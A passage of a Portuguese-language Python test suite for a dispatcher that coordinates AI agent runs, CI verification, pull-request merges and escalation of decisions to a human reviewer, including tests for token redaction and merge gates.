        self._passar(minutos=9, segundos=59)
        d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertEqual(self.forja.merges, [])
        self._passar(segundos=1)
        d.ciclo()
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("repositório sem CI", corpo)
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")

    def test_f1_head_novo_do_fixer_ganha_nova_janela(self):
        self.codigos[H1] = 1
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()  # corrigir
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self._passar(minutos=30)
        self.mover_head(H2, ci="ausente")
        d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertEqual(self.estado()["seeds"]["s-1"]["headVistoEm"], self.instante.isoformat())

    # ------------------------------------------------ F2: falha de infraestrutura na verificação
    def test_f2a_verificacao_que_nao_executou_pausa_uma_vez_sem_fixer(self):
        """probe_loop / probes B: 125 (daemon), 126, e o erro interno do verificador pausam; nada vai ao fixer."""
        casos = (
            (125, "docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock", {}),
            (126, "permission denied", {}),
            (2, "export inválido: caminho inseguro", {"interno": True}),
            (127, "não foi possível executar docker (FileNotFoundError)", {"interno": True}),
            (1, "docker network create: Cannot connect", {"interno": True}),
        )
        for codigo, saida, extra in casos:
            with self.subTest(codigo=codigo, extra=extra):
                self.setUp()
                self._verificacao_fixa(codigo, saida, **extra)
                d = self.preparar_raia()
                self.abrir_pr(H1)
                d.ciclo()
                e = self.estado()
                self.assertTrue(e["pausado"].startswith("verificação não executou: "), e["pausado"])
                self.assertIn("código %d" % codigo, e["pausado"])
                self.assertIsNone(e["seeds"]["s-1"]["verificacao"])
                self.terminar_revisao(H1)
                for _ in range(3):
                    d.ciclo()
                self.assertEqual(self.runs(HAIKU), [])
                self.assertEqual(self.runs(FABLE), [])
                pausas = [t for t in self._titulos() if t.startswith("[fábrica] despachante pausado: verificação não executou")]
                self.assertEqual(len(pausas), 1)
                self.assertEqual(len(self.verificacoes), 1)

    def test_f2a_codigo_2_do_comando_continua_indo_para_o_fixer(self):
        self._verificacao_fixa(2, "lint falhou")
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        self.assertEqual([a["tipo"] for a in d.ciclo()], ["corrigir"])
        self.assertIsNone(self.estado()["pausado"])

    def test_f2b_codigo_127_do_comando_abre_decisao_sem_fixer_nem_orquestrador(self):
        self._verificacao_fixa(127, "bash: line 1: pnpm: command not found")
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        for _ in range(3):
            d.ciclo()
        self.assertEqual(self.runs(HAIKU), [])
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.forja.merges, [])
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(len(self.verificacoes), 1)  # com a decisão aberta, a verificação não roda de novo
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("o comando de verificação da raia a não existe na imagem: pnpm test", corpo)
        self.assertIn("raia a", titulo)
        (decisao,) = self.estado()["decisoes"]
        self.assertEqual((decisao["tipo"], decisao["alvo"]), ("verificacao", "a"))
        # o Paulo responde: a decisão sai e a verificação volta a rodar
        self._verificacao_fixa(0, "ok")
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="corrigi a imagem")
        d.ciclo()
        self.assertEqual(len(self.verificacoes), 2)

    def test_f2b_falha_ao_abrir_a_decisao_do_127_nao_vira_decisao_de_seed(self):
        self._verificacao_fixa(127, "pnpm: command not found")
        d = self.preparar_raia()
        self.abrir_pr(H1)
        with mock.patch.object(self.forja, "abrir_decisao", side_effect=RuntimeError("HTTP 502")):
            d.ciclo()
        e = self.estado()
        self.assertIsNone(e["seeds"]["s-1"]["pendenteHumano"])
        self.assertIsNone(e["seeds"]["s-1"]["verificacao"])
        self.assertEqual(self.forja.decisoes, [])
        d.ciclo()  # a intenção gravada é recuperada: a decisão abre uma vez
        self.assertEqual(len([t for t in self._titulos() if "comando de verificação" in t]), 1)
        self.assertEqual(self.runs(HAIKU), [])

    def _seed_ate_o_gate_falhar(self, d, it, plan_run):
        sid, url = "s%d" % it, "https://github.com/dono/cliente/pull/%d" % (10 + it)
        ha, hb = ("%x" % (2 * it + 1)).rjust(40, "c"), ("%x" % (2 * it + 2)).rjust(40, "d")
        self.motor.definir_plano(plan_run, "running", [{"seedId": sid, "estado": "pr_open", "runId": "rx%d" % it, "prUrl": url}])
        self.forja.definir_pr(url, head_sha=ha, branch="w/" + sid, arquivos=["src/a/x.ts"])
        self.forja.definir_ci(REPO, ha, "verde")
        d.ciclo()
        self.terminar_revisao(ha, seed=sid)
        d.ciclo()  # verificação 1 → fixer
        fid = self.estado()["seeds"][sid]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self.forja.definir_pr(url, head_sha=hb, branch="w/" + sid, arquivos=["src/a/x.ts"])
        self.forja.definir_ci(REPO, hb, "verde")
        d.ciclo()
        self.terminar_revisao(hb, seed=sid)
        return d.ciclo()

    def test_f2c_terceira_falha_depois_de_2_replanejamentos_vai_para_o_paulo(self):
        """probe_loop com o comando falhando de verdade: 2 replanejamentos pagos e a 3ª falha vira decisão."""
        self._verificacao_fixa(1, "testes falharam")
        d = self.preparar_raia()
        plano_atual = plano(raia("a"))
        for it in range(3):
            acoes = self._seed_ate_o_gate_falhar(d, it, self.estado()["raias"]["a"]["planRunId"])
            if it == 2:
                break
            self.assertEqual([(a["tipo"], a.get("motivo")) for a in acoes], [("acordar", "gate_falhou_apos_fixer")])
            orq = self.estado()["orquestrador"]["runId"]
            plano_atual = plano(raia("a", plano_seeds="pl-0b%02d" % it))
            prq, hp = "https://github.com/dono/cliente/pull/%d" % (90 + it), ("%x" % (it + 1)).rjust(40, "f")
            self.pr_do_orquestrador(orq, [".fabrica/plano.json"], plano_atual, head=hp, url=prq)
            d.ciclo()
            self.assertIn((prq, hp), self.forja.merges)
            self.publicar(plano_atual)
            d.ciclo()
            d.ciclo()
            self.assertEqual(self.estado()["raias"]["a"]["replanejamentos"], it + 1)
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertNotIn("acordar", [a["tipo"] for a in acoes])
        (decisao,) = [x for x in self.estado()["decisoes"] if x.get("tipo") == "replanejamento"]
        self.assertEqual(decisao["alvo"], "gate_falhou_apos_fixer:s2")
        titulo, corpo = self.forja.decisoes[-1]
        self.assertIn("raia a", titulo)
        self.assertIn("2 replanejamentos", corpo)
        pagos = len(self.runs()) + len(self.planos_despachados())
        for _ in range(5):
            d.ciclo()
        self.assertEqual(len(self.runs()) + len(self.planos_despachados()), pagos)
        self.assertEqual(len([x for x in self.estado()["decisoes"] if x.get("tipo") == "replanejamento"]), 1)

    def test_f2c_raia_falhou_no_teto_abre_decisao_e_abaixo_do_teto_acorda(self):
        for replanejamentos, acorda in ((1, True), (2, False), (5, False)):
            with self.subTest(replanejamentos=replanejamentos):
                self.setUp()
                d = self.preparar_raia()
                d.estado["raias"]["a"]["replanejamentos"] = replanejamentos
                d._salvar()
                self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
                d.ciclo()
                d.ciclo()
                self.assertEqual(len(self.runs(FABLE)), 1 if acorda else 0)
                tipos = [x.get("tipo") for x in self.estado()["decisoes"]]
                self.assertEqual(tipos.count("replanejamento"), 0 if acorda else 1)
                if not acorda:
                    self.assertIn("raia_falhou:a", self.estado()["chavesAcordadas"])

    # ------------------------------------------------ F3: PR do orquestrador que mexe nas fases
    def test_f3_pr_do_orquestrador_que_muda_fase_vai_para_o_paulo_qualquer_que_seja_o_motivo(self):
        """probe_fase: acordado por raia_falhou, o orquestrador avança faseAtual; remove ou reordena fases."""
        sem_f2 = _plano_de_duas_fases()
        sem_f2["fases"] = sem_f2["fases"][:1]
        sem_f2["raias"] = sem_f2["raias"][:1]
        casos = {
            "avanca": _plano_de_duas_fases(fase="f2"),
            "remove": sem_f2,
            "reordena": _plano_de_duas_fases(ordem=("f2", "f1")),
        }
        for nome, novo in casos.items():
            with self.subTest(caso=nome):
                self.setUp()
                d, rid = self.acordar_por_falha(_plano_de_duas_fases())
                novo = copy.deepcopy(novo)
                novo["raias"][0]["planoSeeds"] = "pl-00aa"
                self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo)
                d.ciclo()
                self.assertEqual(self.forja.merges, [])
                ((titulo, corpo),) = self.forja.decisoes
                self.assertEqual(titulo, "[fábrica] orquestrador: aprovar mudança de fase")
                self.assertIn("aprovar mudança de fase", corpo)
                orq = self.estado()["orquestrador"]
                self.assertIsNone(orq["runId"])
                self.assertEqual(orq.get("semResultadoSeguidos"), 0)

    def test_f3_pr_que_so_replaneja_sem_mexer_nas_fases_segue_mergeado(self):
        d, rid = self.acordar_por_falha(_plano_de_duas_fases())
        novo = _plano_de_duas_fases()
        novo["raias"][0]["planoSeeds"] = "pl-00aa"
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.forja.decisoes, [])

    def test_f3_fase_concluida_continua_aprovar_fase(self):
        d = self.preparar_raia(_plano_de_duas_fases())
        self.motor.definir_plano("plano-1", "succeeded", [])
        d.ciclo()
        rid = self.estado()["orquestrador"]["runId"]
        self.assertEqual(self.estado()["orquestrador"]["motivo"], "fase_concluida")
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], _plano_de_duas_fases(fase="f2"))
        d.ciclo()
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: aprovar fase")
        self.assertIn("faseAtual", corpo)
        self.assertEqual(self.estado()["orquestrador"].get("semResultadoSeguidos"), 0)

    # ------------------------------------------------ F4: veredito preso ao sha pedido
    def test_f4_revisor_que_aprova_outro_sha_nao_libera_o_merge(self):
        """probes C: a revisão foi pedida em H1 e o veredito fala de H2 (um commit que o revisor pode ter empurrado)."""
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoSha"], H1)
        self.mover_head(H2)
        self.terminar_revisao(H2)
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.runs(OPUS)), 2)
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoSha"], H2)
        self.terminar_revisao(H2)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H2)])

    # ------------------------------------------------ F5: decisões de seed
    def _decisao_por_protegido(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/a/x.ts", ".env.local"))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        return d

    def test_f5_corpo_da_decisao_por_protegido_diz_que_o_merge_e_do_paulo(self):
        self._decisao_por_protegido()
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("Revise e mergeie ou feche o PR %s: o merge é seu." % PR, corpo)
        self.assertNotIn(despachante.RODAPE_DECISAO, corpo)

    def test_f5_corpo_da_decisao_por_merge_recusado_diz_que_o_merge_e_do_paulo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        with mock.patch.object(self.forja, "mergear", return_value=False):
            for _ in range(4):
                d.ciclo()
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("merge recusado pelo GitHub", corpo)
        self.assertIn("Revise e mergeie ou feche o PR %s: o merge é seu." % PR, corpo)

    def test_f5_outras_decisoes_de_seed_mantem_o_rodape(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="ausente")
        d.ciclo()
        self.terminar_revisao(H1)
        self._passar(minutos=11)
        d.ciclo()
        ((_, corpo),) = self.forja.decisoes
        self.assertIn(despachante.RODAPE_DECISAO, corpo)
        self.assertNotIn("o merge é seu", corpo)

    def test_f5_paulo_mergeia_o_pr_a_decisao_fecha_sozinha_e_nao_acorda(self):
        """probe_prot: o Paulo mergeia o PR à mão; o Warren vê o merge; a decisão fecha e sai, sem resposta_paulo."""
        d = self._decisao_por_protegido()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts", ".env.local"], aberto=False, mergeado=True)
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "merged", "runId": "run-filho", "prUrl": PR}])
        d.ciclo()
        d.ciclo()
        e = self.estado()
        self.assertEqual(e["seeds"]["s-1"]["estado"], "mergeada")
        self.assertEqual(e["decisoes"], [])
        self.assertTrue(self.forja._decisoes[url]["fechada"])
        self.assertIn(despachante.MARCADOR_DESPACHANTE, self.forja._decisoes[url]["ultimoComentario"])
        for _ in range(2):
            d.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_f5_seed_removida_ou_obsoleta_fecha_a_decisao_sem_acordar(self):
        for destino in ("removida", "obsoleta"):
            with self.subTest(destino=destino):
                self.setUp()
                d = self._decisao_por_protegido()
                url = self.estado()["decisoes"][0]["url"]
                if destino == "removida":
                    del d.estado["seeds"]["s-1"]
                    self.motor.definir_plano("plano-1", "running", [])  # o Warren também não a lista mais
                else:
                    d.estado["seeds"]["s-1"]["estado"] = "obsoleta"
                d._salvar()
                self.forja.definir_decisao(url, fechada=True, ultimo_comentario="tanto faz")
                d.ciclo()
                d.ciclo()
                self.assertEqual(self.estado()["decisoes"], [])
                self.assertEqual(self.runs(FABLE), [])
                self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_f5_decisao_de_seed_ainda_bloqueada_fechada_com_comentario_acorda(self):
        d = self._decisao_por_protegido()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="pode replanejar")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[0]["prompt"])

    # ------------------------------------------------ F6: piso de 5 min para N6 e N7
    def test_f6_retry_visivel_depois_de_120_ou_300_s_nao_e_pago_de_novo(self):
        for papel in ("revisor", "orquestrador"):
            for atraso in (120, 300):
                with self.subTest(papel=papel, atraso=atraso):
                    self.setUp()
                    self._relogio()
                    self.motor.atraso_de_visibilidade = datetime.timedelta(seconds=atraso)
                    d, campo, original = self._ate_o_run(papel)
                    posts = len(self.runs())
                    self.motor.definir_run(original, estado="failed", motivoFalha="sandbox_run_lost")
                    retry = self.motor.retry_de(original)
                    for _ in range(20):
                        self._avancar()
                        d.ciclo()
                    self.assertEqual(len(self.runs()), posts)
                    self.assertEqual(self._run_de(campo), retry)

    def test_f6_sem_retry_desiste_so_depois_de_5_min(self):
        self._relogio()
        self.motor.retry_infra_perdida = False
        d, campo, original = self._ate_o_run("revisor")
        posts = len(self.runs())
        self.motor.definir_run(original, estado="failed", motivoFalha="sandbox_run_lost")
        for _ in range(9):  # 4 min 30 s: 9 leituras boas, ainda no piso
            self._avancar()
            d.ciclo()
            self.assertEqual(len(self.runs()), posts)
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self.runs()), posts)
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self.runs()), posts + 1)

    def test_f6_plan_run_incerto_visivel_depois_de_120_ou_300_s_paga_um_so(self):
        for atraso in (120, 300):
            with self.subTest(atraso=atraso):
                self.setUp()
                self.motor = MotorTimeoutDepoisDeAceitar("despachar_plano", 1)
                self._relogio()
                self.motor.atraso_de_visibilidade = datetime.timedelta(seconds=atraso)
                self.publicar(plano(raia("a")))
                d = self.novo()
                d.iniciar()
                d.ciclo()
                self.assertEqual(len(self.estado()["despachosIncertos"]), 1)
                for _ in range(20):
                    self._avancar()
                    d.ciclo()
                self.assertEqual(len(self.planos_despachados()), 1)
                self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
                self.assertEqual(self.estado()["despachosIncertos"], [])

    def test_f6_run_incerto_sem_a_chave_de_idempotencia_paga_um_so(self):
        """Restart do Warren entre o POST e a busca (a chave some): só o piso segura o redespacho."""
        for papel, atraso in (("revisor", 120), ("revisor", 300), ("orquestrador", 300)):
            with self.subTest(papel=papel, atraso=atraso):
                self.setUp()
                self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1)
                self._relogio()
                self.motor.atraso_de_visibilidade = datetime.timedelta(seconds=atraso)
                d = self.preparar_raia()
                if papel == "revisor":
                    self.abrir_pr(H1)
                else:
                    self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
                d.ciclo()
                self.motor._idempotencia.clear()
                for _ in range(20):
                    self._avancar()
                    d.ciclo()
                self.assertEqual(len(self._runs_criados()), 1)

    def test_f6_motor_falso_esconde_o_plan_run_durante_o_atraso(self):
        m = motor.MotorFalso()
        relogio = [datetime.datetime(2026, 11, 3, 12, tzinfo=datetime.timezone.utc)]
        m.agora = lambda: relogio[0]
        m.atraso_de_visibilidade = datetime.timedelta(seconds=120)
        nonce = "a" * 32
        pid = m.despachar_plano(projeto=PROJETO, plano_seeds="pl-1", agente="x", modelo="y", prompt_template="t\n" + motor.MARCADOR_NONCE % nonce, max_custo_usd=1)
        self.assertIsNone(m.procurar_plano(PROJETO, nonce))
        relogio[0] += datetime.timedelta(seconds=119)
        self.assertIsNone(m.procurar_plano(PROJETO, nonce))
        relogio[0] += datetime.timedelta(seconds=1)
        self.assertEqual(m.procurar_plano(PROJETO, nonce), pid)

    # ------------------------------------------------ F7: segredo na saída da verificação
    def test_f7_saida_da_verificacao_e_redigida_antes_do_estado_e_do_fixer(self):
        """probes D: o token aparece na saída do git fetch."""
        self._verificacao_fixa(1, "fatal: https://x:%s@github.com/dono/cliente e %s" % (TOKEN_GH, TOKEN))
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (fixer,) = self.runs(HAIKU)
        self.assertNotIn(TOKEN_GH, fixer["prompt"])
        self.assertNotIn(TOKEN, fixer["prompt"])
        self.assertIn("https://x:***@github.com", fixer["prompt"])
        bruto = (self.raiz / "estado.json").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN_GH, bruto)
        self.assertNotIn(TOKEN, bruto)

    # ------------------------------------------------ F9: merge do Paulo no PR do orquestrador
    def _decisao_de_fase(self):
        self.publicar(plano(raia("a")))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] orquestrador: aprovar fase")
        return d, self.estado()["decisoes"][0]["url"]

    def test_f9_merge_do_paulo_aprova_e_fecha_a_decisao_sem_acordar(self):
        for fechada in (False, True):
            with self.subTest(issue_fechada=fechada):
                self.setUp()
                d, url = self._decisao_de_fase()
                self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/plano.json"], aberto=False, mergeado=True)
                if fechada:
                    self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
                d.ciclo()
                d.ciclo()
                e = self.estado()
                self.assertEqual(e["decisoes"], [])
                self.assertTrue(self.forja._decisoes[url]["fechada"])
                self.assertEqual(len(self.runs(FABLE)), 1)
                self.assertEqual(e["acordarPendentes"], [])
                self.assertNotIn(PR_ORQ, e.get("prsOrquestrador") or [])

    def test_f9_fechada_sem_merge_com_comentario_vai_ao_orquestrador(self):
        d, url = self._decisao_de_fase()
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="não: refaça a fase 2")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("refaça a fase 2", self.runs(FABLE)[1]["prompt"])

    # ------------------------------------------------ F10: estado.json corrompido
    def test_f10_estado_corrompido_sai_com_2_e_mensagem_curta(self):
        for conteudo in ("{quebrado", "[]", "NaN"):
            with self.subTest(conteudo=conteudo):
                (self.raiz / "estado.json").write_text(conteudo, encoding="utf-8")
                for argv in (["rodar"], ["status"], ["retomar"]):
                    erro = io.StringIO()
                    codigo = despachante.main(
                        argv, ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: self.novo(), saida=io.StringIO(), erro=erro
                    )
                    self.assertEqual(codigo, 2, argv)
                    self.assertIn("estado.json ilegível", erro.getvalue())
                    self.assertNotIn("Traceback", erro.getvalue())
                    self.assertLess(len(erro.getvalue()), 300)

    def test_f10_estado_corrompido_depois_de_construido_tambem_e_entrada_invalida(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        (self.raiz / "estado.json").write_text("{quebrado", encoding="utf-8")
        with self.assertRaises(despachante.ErroDeEntrada):
            d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)


class TestesCorrecaoFinalPreparo(Base):
    preparar_falso = TestesPrepararWarren.preparar_falso
    rodar_com = TestesPrepararWarren.rodar_com
    drenagem = TestesPrepararWarren.drenagem
    TITULO_AUTOMERGE = "[fábrica] warren-automerge ainda ativo"

    def _preparar(self, automerge):
        """Um preparar cujo `automerge` vem da lista mutável `automerge` (o último valor vale)."""

        def preparar(**kwargs):
            return {"estado": "ja_aplicado", "detalhe": "x", "dropin": "ok", "automerge": automerge[-1], "sha": "a" * 64}

        return preparar

    def _rodar(self, d, ciclos=1):
        d.rodar(intervalo=1, ciclos=ciclos, dormir=lambda s: None)

    # ------------------------------------------------ F8: automerge em erro
    def test_f8_automerge_em_erro_segura_os_merges_abre_uma_decisao_e_retoma(self):
        for desligado in ("desligado", "ausente", "ja_desligado"):
            with self.subTest(desligado=desligado):
                self.setUp()
                automerge = ["erro"]
                self.publicar(plano(raia("a")))
                d = self.novo(preparar_warren=self._preparar(automerge))
                d.iniciar()
                self._rodar(d)
                self.assertEqual(len(self.planos_despachados()), 1)  # os despachos seguem
                self.abrir_pr(H1)
                self._rodar(d)
                self.terminar_revisao(H1)
                self._rodar(d, ciclos=3)
                self.assertEqual(self.forja.merges, [])
                titulos = [t for t, _ in self.forja.decisoes]
                self.assertEqual(titulos.count(self.TITULO_AUTOMERGE), 1)
                (_, corpo), = [x for x in self.forja.decisoes if x[0] == self.TITULO_AUTOMERGE]
                self.assertIn("warren-automerge ainda ativo: ele mergeia PRs sem os gates", corpo)
                url = [x["url"] for x in self.estado()["decisoes"] if x.get("tipo") == "automerge"][0]
                automerge.append(desligado)
                self._rodar(d, ciclos=2)
                self.assertEqual(self.forja.merges, [(PR, H1)])
                self.assertTrue(self.forja._decisoes[url]["fechada"])
                self.assertEqual([x for x in self.estado()["decisoes"] if x.get("tipo") == "automerge"], [])
                self.assertEqual(self.runs(FABLE), [])

    def test_f8_automerge_em_erro_segura_o_merge_do_pr_do_orquestrador(self):
        automerge = ["erro"]
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=self._preparar(automerge))
        d.iniciar()
        self._rodar(d)
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        self._rodar(d)
        rid = self.estado()["orquestrador"]["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        self._rodar(d, ciclos=2)
        self.assertEqual(self.forja.merges, [])
        automerge.append("desligado")
        self._rodar(d)
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])

    # ------------------------------------------------ F13: teto da drenagem
    def test_f13_teto_de_25_min_sem_o_drop_in_confirmado(self):
        inicio = self.instante
        passo = datetime.timedelta(minutes=5)
        d = self.rodar_com(["aguardando_runs"], ciclos=6, passo=passo)
        # checagens em t0..t25; a drenagem liga em t5 e em t25 faz 20 min
        self.assertEqual(self.drenagem()["desde"], (inicio + passo).isoformat())
        d = self.rodar_com(None, ciclos=1, passo=passo, d=d)  # t30: 25 min
        self.assertFalse(self.drenagem().get("desde"))
        (aviso,) = [a for a in self.estado()["avisos"] if "drenagem" in a]
        self.assertIn("25 min", aviso)

    def test_f13_teto_de_45_min_com_o_drop_in_carregado(self):
        inicio = self.instante
        passo = datetime.timedelta(minutes=5)
        self.publicar(plano(raia("a")))
        self.ciclos_feitos = []
        d = self.novo(preparar_warren=self.preparar_falso(["ja_aplicado", "aguardando_runs"]))
        d.iniciar()
        d.estado["warrenPreparado"] = {"estado": "aguardando_runs", "esperasSeguidas": 0}
        d._salvar()
        d = self.rodar_com(None, ciclos=1, passo=passo, d=d)  # t0: ja_aplicado com o drop-in ok confirma
        self.assertIs(self.estado()["warrenPreparado"]["dropinCarregado"], True)
        d.estado = self.estado()
        d.estado["warrenPreparado"]["estado"] = "aguardando_runs"
        d._salvar()
        d = self.rodar_com(None, ciclos=8, passo=passo, d=d)  # t5..t40: liga em t10, em t40 faz 30 min
        self.assertEqual(self.drenagem()["desde"], (inicio + 2 * passo).isoformat())
        d = self.rodar_com(None, ciclos=2, passo=passo, d=d)  # t50: 40 min
        self.assertTrue(self.drenagem().get("desde"))
        d = self.rodar_com(None, ciclos=1, passo=passo, d=d)  # t55: 45 min
        self.assertFalse(self.drenagem().get("desde"))

    def test_f13_drop_in_em_erro_desconfirma(self):
        self.publicar(plano(raia("a")))
        self.ciclos_feitos = []
        d = self.novo(preparar_warren=self.preparar_falso([{"estado": "ja_aplicado", "detalhe": "", "dropin": "erro", "automerge": "ausente"}]))
        d.iniciar()
        d.estado["warrenPreparado"] = {"estado": "ja_aplicado", "dropinCarregado": True}
        d._salvar()
        self.rodar_com(None, ciclos=1, d=d)
        self.assertIs(self.estado()["warrenPreparado"]["dropinCarregado"], False)
        for estado, dropin, esperado in (
            ("aguardando_runs", "ok", False),
            ("revertido", "ok", False),
            ("aplicado", "alterado", True),
            ("versao_desconhecida", "ok", True),
        ):
            with self.subTest(estado=estado, dropin=dropin):
                self.setUp()
                self.publicar(plano(raia("a")))
                self.ciclos_feitos = []
                d = self.novo(preparar_warren=self.preparar_falso([{"estado": estado, "detalhe": "", "dropin": dropin, "automerge": "ausente"}]))
                d.iniciar()
                self.rodar_com(None, ciclos=1, d=d)
                self.assertIs(self.estado()["warrenPreparado"]["dropinCarregado"], esperado)


# ---------------------------------------------------------------- fila por plano (Task 1)


def _dict_url(item):
    return item.get("url") if isinstance(item, dict) else None


class TestCaminhoDoPlano(Base):
    """O despachante fala de um plano (`caminho_plano`), não do repositório."""

    CAMINHO = ".fabrica/planos/login.json"

    def publicar(self, plano_, ref="main"):
        texto = plano_ if isinstance(plano_, str) else json.dumps(plano_)
        self.forja.definir_arquivo(REPO, ref, self.CAMINHO, texto)

    def novo(self, **extra):
        extra.setdefault("caminho_plano", self.CAMINHO)
        return super().novo(**extra)

    def ambiente_real(self, **extra):
        (self.repo_dir / ".fabrica").mkdir(exist_ok=True)
        (self.repo_dir / ".fabrica" / "config.json").write_text(json.dumps(CONFIG), encoding="utf-8")
        (self.tmp / "w").write_text(TOKEN + "\n", encoding="utf-8")
        (self.tmp / "g").write_text(TOKEN_GH + "\n", encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "w"),
            "GH_TOKEN_FILE": str(self.tmp / "g"),
        }
        ambiente.update(extra)
        return ambiente

    def test_padrao_e_o_plano_legado(self):
        d = super().novo()
        self.assertEqual(d.caminho_plano, ".fabrica/plano.json")
        self.assertEqual(despachante.permitidos_ao_orquestrador(".fabrica/plano.json"), despachante.PERMITIDOS_AO_ORQUESTRADOR)

    def test_le_o_plano_do_caminho_dado(self):
        self.forja.definir_arquivo(REPO, "main", ".fabrica/plano.json", json.dumps(plano(raia("x"))))
        self.publicar(plano(raia("a")))
        d = self.novo()
        self.assertEqual(d.caminho_plano, self.CAMINHO)
        d.iniciar()
        self.assertEqual(sorted(self.estado()["raias"]), ["a"])
        self.assertEqual(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["raias"][0]["id"], "a")

    def test_plano_ausente_cita_o_caminho_dado(self):
        self.forja.definir_arquivo(REPO, "main", ".fabrica/plano.json", json.dumps(plano(raia("x"))))
        with self.assertRaises(despachante.ErroDeEntrada) as ctx:
            self.novo().iniciar()
        self.assertIn(self.CAMINHO, ctx.exception.erros[0])

    def test_permitidos_trocam_so_o_plano(self):
        self.assertEqual(
            despachante.permitidos_ao_orquestrador(self.CAMINHO),
            (self.CAMINHO, est.PERGUNTA_DO_ORQUESTRADOR, ".fabrica/planejamento/**", ".seeds/**"),
        )

    def test_pr_do_orquestrador_que_muda_so_o_seu_plano_e_mergeavel(self):
        d, rid = self.acordar_por_falha()
        self.assertIn("Seu plano: `%s`" % self.CAMINHO, self.runs(FABLE)[-1]["prompt"])
        self.pr_do_orquestrador(rid, [self.CAMINHO, ".seeds/issues.jsonl"], plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.forja.decisoes, [])

    def test_pr_que_muda_outro_plano_vai_para_o_paulo(self):
        for intruso in (".fabrica/planos/outro.json", ".fabrica/plano.json"):
            for arquivos in ([intruso], [self.CAMINHO, intruso]):
                with self.subTest(arquivos=arquivos):
                    self.setUp()
                    d, rid = self.acordar_por_falha()
                    self.pr_do_orquestrador(rid, arquivos, plano(raia("a", plano_seeds="pl-00aa")))
                    d.ciclo()
